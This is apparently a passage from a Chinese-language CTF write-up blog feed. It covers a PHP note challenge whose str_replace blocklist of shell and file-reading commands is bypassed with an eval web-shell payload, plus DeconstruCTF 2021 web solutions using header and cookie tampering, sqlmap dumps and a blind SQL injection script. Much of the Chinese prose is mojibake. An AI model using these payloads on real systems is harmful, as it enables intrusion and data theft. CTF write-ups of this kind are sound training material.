&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">$length&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$randomString&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#111">$characters&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$charactersLength&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)];&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$randomString&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$originalstring&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;?php&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$originalstring&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;?&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;?&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;fopen&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;fread&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;file_get_contents&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;fgets&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cat&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;strings&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;less&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;more&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;head&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tail&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;dd&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;cut&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;grep&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tac&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;awk&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sed&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;read&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">str_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;system&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;notewrite&amp;#34;&lt;/span>&lt;span style="color:#111">]))&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$newnote&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;notewrite&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#75715e">//3rd times the charm and I&amp;#39;ve learned my lesson. Now I&amp;#39;ll make sure to filter more than once :)
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$newnote&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$notetoadd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">filter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">generateRandomString&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">array_push&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;notes&amp;#34;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">$filename&lt;/span>&lt;span style="color:#d88200">.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">$filename&lt;/span>&lt;span style="color:#d88200">.php&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$notetoadd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;location:index.php&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç®€å•çœ‹ä¸€ä¸‹æµç¨‹ï¼Œ&lt;code>filter()&lt;/code>å‡½æ•°ä¼šå¯¹æˆ‘ä»¬postä¼ å…¥çš„notewriteå‚æ•°ï¼ˆä¹Ÿå°±æ˜¯ä¼šè¢«å†™å…¥çš„æ–‡ä»¶å†…å®¹ï¼‰è¿›è¡Œæ¯”è¾ƒä¸¥æ ¼çš„è¿‡æ»¤ï¼Œæ–‡ä»¶åæ˜¯&lt;code>generateRandomString()&lt;/code>ç”Ÿæˆçš„éšæœºåå­—ï¼Œä½†æ˜¯ä¸é‡è¦ï¼Œå®ƒä¼šè‡ªåŠ¨æ‹¼ä¸Š.phpçš„åŽç¼€å¹¶ä¸”æŠŠåå­—å†™åˆ°&lt;code>session['notes']&lt;/code>ä¸­ï¼›æ‰€ä»¥æˆ‘ä»¬å”¯ä¸€éœ€è¦å¤„ç†çš„å°±æ˜¯&lt;code>filter()&lt;/code>å‡½æ•°çš„ç»•è¿‡äº†&lt;/p>
&lt;p>å°´å°¬çš„æ˜¯è¿™ä¸ª&lt;code>filter()&lt;/code>è·Ÿä¸ªç­›å­ä¸€æ ·â€¦â€¦é¦–å…ˆæ˜¯æ²¡æœ‰è¿‡æ»¤&lt;code>eval()&lt;/code>ï¼Œå…¶æ¬¡æ˜¯&lt;code>str_replace()&lt;/code>ä¹Ÿæ˜¯æ°´çš„ä¸€æ‰¹&lt;/p>
&lt;p>payload:&lt;/p>
&lt;pre tabindex="0">&lt;code>notewrite=%3C%3C%3C%3C%3F%3F%3F%3Fphp+%40eval%28%24_POST%5B%27wuhu%27%5D%29%3B
&lt;/code>&lt;/pre>&lt;p>ä¹‹åŽè¿žä¸Šèšå‰‘å³å¯æŸ¥çœ‹æ ¹ç›®å½•ä¸‹çš„flag.php&lt;/p>
&lt;p>&lt;code>flag{wait_but_i_fixed_it_after_my_last_two_blunders_i_even_filtered_three_times_:(((}&lt;/code>&lt;/p>
&lt;h2 id="forensicsobligatory-shark">forensics/Obligatory Shark&lt;/h2>
&lt;blockquote>
&lt;p>remember to wrap the flag&lt;/p>
&lt;/blockquote>
&lt;p>çœ‹tcpæµï¼Œtelnetæ˜Žæ–‡æµé‡&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211030120130169.png" alt="image-20211030120130169">&lt;/p>
&lt;p>33a465747cb15e84a26564f57cda0988&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107144316344.png" alt="image-20211107144316344">&lt;/p>
&lt;p>&lt;code>flag{dancingqueen}&lt;/code>&lt;/p></description></item><item><title>DeconstruCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/30/deconstructf2021-wp/</link><pubDate>Sat, 30 Oct 2021 13:35:32 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/30/deconstructf2021-wp/</guid><description>&lt;p>&lt;a href="https://ctftime.org/event/1453/tasks/">https://ctftime.org/event/1453/tasks/&lt;/a>&lt;/p>
&lt;h2 id="webheres-a-flag">Web/Here&amp;rsquo;s a Flag&lt;/h2>
&lt;blockquote>
&lt;p>A quick teaser to get yourself ready for the challenges to come! Just look for/at the flag and perhaps try your hand at some frontend tomfoolery?&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003224148107.png" alt="image-20211003224148107">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003224209166.png" alt="image-20211003224209166">&lt;/p>
&lt;p>&lt;a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">https://www.youtube.com/watch?v=dQw4w9WgXcQ&lt;/a> ä¸ç”¨çœ‹äº† Never Gonna Give You Up&lt;/p>
&lt;p>çœ‹style.css flag: &amp;ldquo;gvf{zh0frph_wr_ghfrqvwuxfwi}&amp;quot;; ä½†æ˜¯ä¸æ˜¯æœ€ç»ˆçš„flagï¼Œè§£ä¸€ä¸‹rot13 amount=23&lt;/p>
&lt;p>&lt;code>dsc{we0come_to_deconstructf}&lt;/code>&lt;/p>
&lt;p>ç­¾åˆ°é¢˜ä¹Ÿå¥½æŠ˜è…¾TAT&lt;/p>
&lt;h2 id="webplease">Web/Please&lt;/h2>
&lt;blockquote>
&lt;p>Hi there! We used to work together back in our old company DEEMA. I recently had a problem with my computer and lost all the files on it. I remember creating a backup of my files on the company&amp;rsquo;s servers. I know it&amp;rsquo;s been a while, but could you &lt;strong>please&lt;/strong> try to access those files? I would be very grateful!&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003225518532.png" alt="image-20211003225518532">&lt;/p>
&lt;p>ç†Ÿç»ƒæŠ“åŒ…ï¼ŒCookieä¸­æœ‰ä¸¤ä¸ªå‚æ•°ï¼ŒAdmin_Accesså’ŒUsernameï¼Œæ”¹ä¸ºTrueå’ŒClancy&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003230430641.png" alt="image-20211003230430641">&lt;/p>
&lt;p>æ”¹æµè§ˆå™¨æ ‡è¯†å¤´ &lt;code>User-Agent: DeemBrowser&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003230638917.png" alt="image-20211003230638917">&lt;/p>
&lt;p>éœ€è¦åŸºç¡€è®¤è¯ï¼Œä½†æ˜¯è¿™é‡Œçš„MagicWordç¨å¾®å¡äº†ä¸€ä¸‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003232421727.png" alt="image-20211003232421727">&lt;/p>
&lt;p>åŽŸå› æ˜¯æˆ‘å¤ªé“¸å¸äº†å¿˜äº†åŠ Basicï¼Œ&lt;code>Authorization: Basic V2hhdCdzVGhlTWFnaWNXb3JkPw==&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004003846943.png" alt="image-20211004003846943">&lt;/p>
&lt;p>åŠ ä¸€ä¸ªæ—¥æœŸçš„å¤´ï¼Œ&lt;code>Date: Thu, 1 Apr 2021 12:00:00 GMT&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004004026742.png" alt="image-20211004004026742">&lt;/p>
&lt;p>æ¢æˆ&lt;code>Date: Mon, 5 Apr 2021 12:00:00 GMT&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004004153788.png" alt="image-20211004004153788">&lt;/p>
&lt;p>&lt;code>dsc{4ll-y0u-g0tt4-d0-15-r3qu35t-n1c3ly}&lt;/code>&lt;/p>
&lt;h2 id="webtaxi-union-problems">Web/Taxi Union Problems&lt;/h2>
&lt;blockquote>
&lt;p>An important package has been stolen from Mr Nagaraj by a Taxi driver. We&amp;rsquo;ve tried to ask the local taxi union about driver&amp;rsquo;s location but they are refusing provide the same.&lt;/p>
&lt;p>Since this package is required for a time sensitive matter we don&amp;rsquo;t have time to negotiate with the union.&lt;/p>
&lt;p>Your task is to obtain the location of the taxi using the given information
&lt;code>Taxi Lisence Plate: TN-06-AP-9879&lt;/code>&lt;/p>
&lt;p>HINT: The flag is the location of the taxi (no caps)&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211003233419781.png" alt="image-20211003233419781">&lt;/p>
&lt;p>è¾“å…¥&lt;code>TN-06-AP-9879'--%20&lt;/code>å›žæ˜¾ä¸€æ ·ï¼Œæœ‰æ³¨å…¥ï¼ŒæŠŠpostçš„å†…å®¹æ‹¿åŽ»è®©sqlmapè·‘ä¸€ä¸‹&lt;/p>
&lt;pre tabindex="0">&lt;code>python sqlmap.py -r &amp;quot;/home/amelia/sh4r3/post.txt&amp;quot; -p lisence_plate --tables
python sqlmap.py -r &amp;quot;/home/amelia/sh4r3/post.txt&amp;quot; -p lisence_plate -T taxi --columns
python sqlmap.py -r &amp;quot;/home/amelia/sh4r3/post.txt&amp;quot; -p lisence_plate -T taxi --dump
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004000253417.png" alt="image-20211004000253417">&lt;/p>
&lt;p>Ayanavaram&lt;/p>
&lt;h2 id="webnever-gonna-lie-to-you">*Web/Never gonna lie to you&lt;/h2>
&lt;blockquote>
&lt;p>Trust me, take everything in the home page for face value. I would never lie to you.&lt;/p>
&lt;/blockquote>
&lt;p>ä¸»é¡µæœ‰ä¸€å¥&lt;em>Not even search engines can find it.&lt;/em>ï¼Œæç¤ºæˆ‘ä»¬çœ‹/robots.txt&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004000643314.png" alt="image-20211004000643314">&lt;/p>
&lt;p>è½¬åˆ°/never_gonna_give_you_upé¡µé¢ï¼Œæ ‡é¢˜æ˜¯Admin Pageä½†æ˜¯ä¸€ç‰‡ç©ºç™½ï¼ŒæŠ“åŒ…åŽçœ‹åˆ°postè¡¨å•çš„åœ°æ–¹è¢«æŠ¬å¤´ç»™æŒ¡ä½äº†ï¼Œç›®æ ‡åœ°å€æ˜¯/never_gonna_let_you_down&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004000944013.png" alt="image-20211004000944013">&lt;/p>
&lt;p>æäº¤ä¸¤ä¸ªå‚æ•°usernameå’Œpasswordï¼Œå›žæ˜¾&lt;em>YOU LIED TO ME !!!&lt;/em>&lt;/p>
&lt;p>â€”â€”â€”â€”ç„¶åŽæ²¡ç„¶åŽäº† æˆ‘è¿˜æ²¡çœ‹å®Œ çŽ¯å¢ƒå°±å…³äº†TAT&lt;/p>
&lt;h2 id="webcurly-fries-1">Web/Curly Fries 1&lt;/h2>
&lt;blockquote>
&lt;p>Normal fries are nice, but everything&amp;rsquo;s better with a curl in it. The flag is right in front of you.&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004170846442.png" alt="image-20211004170846442">&lt;/p>
&lt;p>emmmmm æ²¡æœ‰ä»»ä½•æç¤º&lt;/p>
&lt;p>çœ‹wpä»¥åŽå‘çŽ°è¿™æ˜¯çœŸè„‘æ´žäº†ï¼Œä½†ä¹Ÿä¸èƒ½è¿™ä¹ˆè¯´ï¼Œæ¯•ç«Ÿå·²ç»ç»™å‡ºäº†Swedenå¾ˆæ˜Žæ˜¾çš„æç¤ºï¼Œæˆ‘ä»¬éœ€è¦ç”¨æŒ‡å®šçš„Swedishè¯­è¨€æ¥è®¿é—®è¿™ä¸ªç½‘ç«™&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -i http://very.uniquename.xyz:8880/ -H &lt;span style="color:#d88200">&amp;#34;Accept-Language: sv-SE&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004171513900.png" alt="image-20211004171513900">&lt;/p>
&lt;p>&lt;code>dsc{1_l0v3_sw3d3n}&lt;/code>&lt;/p>
&lt;h2 id="webthe-gate-keeper">Web/The Gate Keeper&lt;/h2>
&lt;blockquote>
&lt;p>That what you want is with the Gate keeper, but you need to cheat the Gate keeper to get it.&lt;/p>
&lt;p>&lt;strong>Note:&lt;/strong> This challenge might require a bruteforce approach.&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211004171755317.png" alt="image-20211004171755317">&lt;/p>
&lt;p>è¿˜æ˜¯sqli&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">domain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ascii_lowercase&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">ascii_uppercase&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digits&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;_}&amp;#39;&lt;/span>
